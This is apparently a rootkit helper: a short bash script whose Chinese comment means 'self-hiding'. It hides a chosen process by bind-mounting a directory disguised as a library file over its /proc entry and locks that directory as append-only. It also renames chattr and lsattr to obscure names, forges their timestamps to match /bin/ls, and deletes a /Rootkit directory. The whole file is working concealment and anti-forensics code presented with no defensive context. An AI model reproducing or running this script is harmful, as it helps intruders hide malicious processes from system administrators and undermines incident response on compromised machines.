#!/bin/bash
#@自我隐藏
pid=$1
src_file="/lib/x86_64-linux-gnu/.libexports.so.7.0"
mkdir -p $src_file
mount -o bind ${src_file} /proc/${pid}
/usr/bin/chattr +a ${src_file} || /usr/bin/cht +a ${src_file}
mv /usr/bin/chattr /usr/bin/cht || echo 0
mv /usr/bin/lsattr /usr/bin/lst || echo 0
touch -acmr /bin/ls /usr/bin/cht || echo 0
touch -acmr /bin/ls /usr/bin/lst || echo 0
rm -rf /Rootkit
